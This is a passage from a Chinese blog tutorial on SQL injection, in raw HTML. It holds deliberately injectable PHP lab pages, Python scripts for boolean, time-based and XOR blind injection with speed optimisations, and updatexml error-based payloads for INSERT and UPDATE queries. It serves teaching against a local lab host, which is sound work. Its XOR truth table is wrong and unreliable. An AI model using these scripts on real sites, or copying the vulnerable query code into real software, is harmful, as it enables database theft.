class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;You are in ...&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are not in ...&#x27;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>; <span class="comment">// 布尔盲注</span></span><br><span class="line">         <span class="comment">//echo &#x27;You are in ...&lt;hr&gt;&#x27;; // 时间盲注</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1、布尔盲注"><a href="#1、布尔盲注" class="headerlink" title="1、布尔盲注"></a>1、布尔盲注</h3><p>Boolean 是基于真假的判断，不管输入什么，结果都只返回真或假两种情况。Boolean 型盲注的关键在于通过表达式结果与已知值进行比对，根据比对结果判断正确与否。盲注有时需要一个一个字符去猜，因此一些字符串操作的函数经常被用到</p><p>介绍下面几个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">length()：返回查询字符串的长度</span><br><span class="line">mid(column_name,start,length)：截取字符串</span><br><span class="line">subctr(string,start,length)：截取字符串</span><br><span class="line">Left(string,n)：截取字符串</span><br><span class="line">ORD()：返回字符的ASCII码</span><br><span class="line">ASCII()：返回字符的ASCII码</span><br></pre></td></tr></table></figure><p>先来说说原理，怎么手工注入，首先来查一下数据库名，根据上面所介绍的函数，我们可以用 substr 函数来进行截取，我们截取数据库第一个字符，步长为一，执行下面语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; and substr(database(),1,1)=&#x27;</span>l<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>执行完后会发现页面显示 <code>You are in ...</code> 这说明语句是可以执行，而且数据库第一个字符确实是 <code>l</code> ，如果执行失败就会显示 <code>You are not in ...</code> ，那么我们就可以利用这一点来一个一个爆破出我们想要的东西。但是缺陷就是慢，手工的话确实很麻烦也很慢，所以这里要利用到 Python 来写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 需要跑的列表</span></span><br><span class="line">lists = <span class="string">&#x27;&#123;abcdefghijklmnopqrstuvwxyz0123456789-,.&#125;&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> lists:</span><br><span class="line">        <span class="comment"># 爬虫，get 方式提交数据</span></span><br><span class="line">        url = <span class="string">&#x27;http://192.168.2.131/sql_bool.php?id=1\&#x27;&#x27;</span></span><br><span class="line">        payload = <span class="string">&#x27; and substr(database(),&#123;&#125;,1) = \&#x27;&#123;&#125;\&#x27;--+&#x27;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        url1 = url + payload</span><br><span class="line">        resp = s.get(url1,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="comment"># 如果页面显示 &quot;You are in ...&quot; 就返回当前的 j 的字符</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in ...&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            data += j</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>这里是利用了 Python 爬虫来帮我们去跑，这里不讲解基础，如果想要了解 Python 爬虫或者 Python 基础，可以去我博客里的 Python 看看。</p><p>那么上面是跑数据库，数据库知道了，我们需要知道表名可以做如下修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27; and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1) = \&#x27;&#123;&#125;\&#x27;--+&#x27;</span>.<span class="built_in">format</span>(i,j)</span><br></pre></td></tr></table></figure><p>那么现在应该知道了，只需要在 substr 函数的第一个参数修改即可，接下来的步骤应该很清楚了，这里就不再演示了。</p><h3 id="2、时间盲注（延时注入）"><a href="#2、时间盲注（延时注入）" class="headerlink" title="2、时间盲注（延时注入）"></a>2、时间盲注（延时注入）</h3><p>Boolean 盲注还是能通过页面返回的对错来判断，当页面任何信息都不返回的时候，就需要用时间盲注了，时间盲注就是在布尔盲注的基础上，首先经过真假的判断，然后再真假判断上添加时间的判断</p><p>介绍几个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">length()：返回查询字符串的长度</span><br><span class="line">mid(column_name,start,length)：截取字符串</span><br><span class="line">subctr(string,start,length)：截取字符串</span><br><span class="line">Left(string,n)：截取字符串</span><br><span class="line">ORD()：返回字符的ASCII码</span><br><span class="line">ASCII()：返回字符的ASCII码</span><br><span class="line">if()：逻辑判断</span><br><span class="line">sleep()：控制时间</span><br><span class="line">benchmark()：控制时间</span><br></pre></td></tr></table></figure><p>在演示之前当然要先手工注入，主要的函数还是 <code>sleep()</code>，利用 sleep 测试页面响应的时间来判断是否有漏洞。下面演示代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">lists = <span class="string">&#x27;&#123;abcdefghijklmnopqrstuvwxyz0123456789-,.&#125;&#x27;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.2.131/sql_time.php?id=1\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> lists:</span><br><span class="line">        payload = url + <span class="string">&#x27; and if((substr(database(),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;),sleep(2),sleep(1))--+&#x27;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        start = time.time()</span><br><span class="line">        resp = s.get(payload,timeout=<span class="number">10</span>)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt;= <span class="number">2</span>:</span><br><span class="line">            data += j</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>上述代码除了慢还是慢，因为要延时需要时间，那么就需要优化脚本，这里可以用二分法，但是二分法同样还是慢，因为延时注入的局限性，不可避免的，只是说相对快很多。具体操作请移步至脚本优化问题查看。</p><h3 id="3、异或注入"><a href="#3、异或注入" class="headerlink" title="3、异或注入"></a>3、异或注入</h3><p>异或注入适用于像 union、and 等被过滤了就可以利用异或注入来盲注，下面介绍一下异或的算法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1^1=0</span><br><span class="line">0^0=0</span><br><span class="line">1^0=0</span><br><span class="line">0^1=0</span><br><span class="line">口诀就是：相同为0，不同为1</span><br></pre></td></tr></table></figure><p>根据这个性质就可以利用他来完成注入，举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&#x27;admin&#x27;;</span><br><span class="line">// 这条语句返回结果是 true，也就是1，是真。那如果我们在后面异或一条语句会怎么样。</span><br><span class="line">// 假设 substr(database(),1,1)=&#x27;l&#x27; 这条语句是真的</span><br><span class="line"></span><br><span class="line">select * from user where username=&#x27;admin&#x27;^(substr(database(),1,1)=&#x27;l&#x27;);</span><br><span class="line">// 那么这里的结果应该无法返回的，因为相同为0，前面是1，异或的语句也是1，就会导致返回的结果为空。</span><br><span class="line"></span><br><span class="line">select * from user where username=&#x27;0&#x27;^(substr(database(),1,1)=&#x27;l&#x27;);</span><br><span class="line">// 不同为1，就可以利用这个性质来注入。</span><br></pre></td></tr></table></figure><p>下面利用异或性质构造代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="comment"># 这里要改一个不存在的数据，才能使得不同为1</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.2.131/sql_bool.php?id=0\&#x27;&#x27;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">lists = <span class="string">&#x27;&#123;abcdefghijklmnopqrstuvwxyz0123456789-,.&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> lists:</span><br><span class="line">        <span class="comment"># 构造异或代码</span></span><br><span class="line">        payload = url + <span class="string">&#x27;^(substr(database(),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;)--+&#x27;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        resp = s.get(payload,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in ...&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            data += j</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><h3 id="4、脚本优化问题"><a href="#4、脚本优化问题" class="headerlink" title="4、脚本优化问题"></a>4、脚本优化问题</h3><p>盲注一般会考虑时间问题，如果字符串很长会需要跑很久，这里就会涉及到脚本优化的问题。</p><h4 id="（1）优化字典"><a href="#（1）优化字典" class="headerlink" title="（1）优化字典"></a>（1）优化字典</h4><p>例如，像 flag 只有小写英文字母还有大括号，那么我们就可以优化一下字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lists = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#123;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="（2）枚举法"><a href="#（2）枚举法" class="headerlink" title="（2）枚举法"></a>（2）枚举法</h4><p>还有就是利用 ascii 码跑，这样就不用字典了，纯数字。这里演示一下利用枚举法跑布尔注入的脚本，其他注入也是类似：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.session()</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">129</span>):</span><br><span class="line">        url = <span class="string">&#x27;http://192.168.2.131/sql_bool.php?id=1\&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># 查库</span></span><br><span class="line">        <span class="comment"># 这里要注意括号，意思就是如果他们的 ascii 码相同就返回 1 ，不相同就返回 0</span></span><br><span class="line">        payload = <span class="string">&#x27; and if((ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;),1,0)--+&#x27;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        url1 = url + payload</span><br><span class="line">        resp = s.get(url1,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in ...&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            data += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><h4 id="（3）二分法"><a href="#（3）二分法" class="headerlink" title="（3）二分法"></a>（3）二分法</h4><p>二分法，如果有学过数据结构看这个会简单一点。步骤如下：</p><p>&lt;1&gt; 首先，从数组的中间元素开始搜索，如果该元素正好是目标元素，则搜索过程结束，否则执行下一步。</p><p>&lt;2&gt; 如果目标元素大于 &#x2F; 小于中间元素，则在数组大于 &#x2F; 小于中间元素的那一半区域查找，然后重复步骤 &lt;1&gt; 的操作。</p><p>&lt;3&gt; 如果某一步数组为空，则表示找不到目标元素。</p><p>下面以布尔盲注（其他的盲注也类似，只是需要改一下 payload 即可）举例，二分法跑数据库名（可以去分析一下代码）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.2.131/sql_bool.php?id=1\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">33</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">130</span></span><br><span class="line">    mid = (<span class="built_in">min</span>+<span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">min</span>&lt;<span class="built_in">max</span>):</span><br><span class="line">        payload = url + <span class="string">&quot; and ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;--+&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        resp = s.get(payload,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in ...&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">chr</span>(mid) == <span class="string">&quot; &quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">chr</span>(mid) != <span class="string">&#x27;!&#x27;</span>):</span><br><span class="line">        data += <span class="built_in">chr</span>(mid)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>这里给了一下上面盲注脚本的运行时间（从快到慢）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">二分法：0.15357589721679688</span><br><span class="line">枚举法：2.0728535652160645</span><br><span class="line">普通盲注：9.19831132888794</span><br></pre></td></tr></table></figure><p>可以看到二分法是最快的，1 秒都不到，但是具体情况具体分析，尽量能用二分法就用，因为节省时间，虽然说那么一两秒不差，但是你别看这几秒，要是字符串多一点就要跑很久了，而且我这里只是跑数据库名，要是跑像 128 位或者更多的会有明显的效果。</p><p>怕有人不信这里给出了跑 flag 的运行时间：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">二分法：1.6893773078918457</span><br><span class="line">普通盲注：10.710144758224487</span><br><span class="line">枚举法：24.298348665237427</span><br></pre></td></tr></table></figure><br><h2 id="四、插入、更新、删除注入"><a href="#四、插入、更新、删除注入" class="headerlink" title="四、插入、更新、删除注入"></a>四、插入、更新、删除注入</h2><p>这里插入、更新、删除写在一起是因为他三个的注入方式是差不多的，原理就是 SQL 插入、更新、删除语句（也就是 insert、update、delete），用户输入的值可控导致可以报错回显数据库的数据。所以这里讲的注入跟报错注入是差不多，不懂报错注入的可以参考前面写的。之所以说跟报错注入差不多是因为这三个的常见利用方式是报错注入，没有说用别的不行，像盲注也是可以的，不能局限于报错注入，要拓宽自己的思维还需要多做实验，做动手。</p><h4 id="一、插入操作"><a href="#一、插入操作" class="headerlink" title="一、插入操作"></a>一、插入操作</h4><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL常规回显注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span>, <span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id,username,password</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$id</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO user(id,username,password) VALUES(<span class="subst">$id</span>,&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;insert success!&#x27;</span>. <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID,USERNAME,PASSWORD as parameter with values&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>核心代码（插入语句 insert）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO user(id,username,password) VALUES($id,&#x27;$username&#x27;,&#x27;$password&#x27;)</span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=4&amp;username=user&amp;password=666666&#x27; and updateXML(1,concat(&#x27;~&#x27;,database()),1))--+</span><br></pre></td></tr></table></figure><p>利用这个方式去注入会得到下面的语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO user(id,username,password) VALUES(4,&#x27;user&#x27;,&#x27;666666&#x27; and updateXML(1,concat(&#x27;~&#x27;,database(),&#x27;~&#x27;),1))--+&#x27;)</span><br></pre></td></tr></table></figure><p>接下来的步骤就是基本注入的步骤，也可以参考报错注入，这里就不再赘述。</p><h4 id="二、更新操作"><a href="#二、更新操作" class="headerlink" title="二、更新操作"></a>二、更新操作</h4><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL常规回显注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 learn</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span>, <span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id,password</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$id</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;UPDATE user set password=&#x27;<span class="subst">$password</span>&#x27; where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;update success!&#x27;</span>. <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID,PASSWORD to update&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>核心代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE user SET password=&#x27;$password&#x27; WHERE id=$id</span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=4&amp;password=123456&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>利用这个方式去注入会得到下面的语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE user SET password=&#x27;123456&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),1)--+&#x27; WHERE id=4</span><br></pre></td></tr></table></figure><p>接下来的步骤就是基本注入的步骤，也可以参考报错注入，这里就不再赘述。</p><h4 id="三、删除操作"><a href="#三、删除操作" class="headerlink" title="三、删除操作"></a>三、删除操作</h4><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 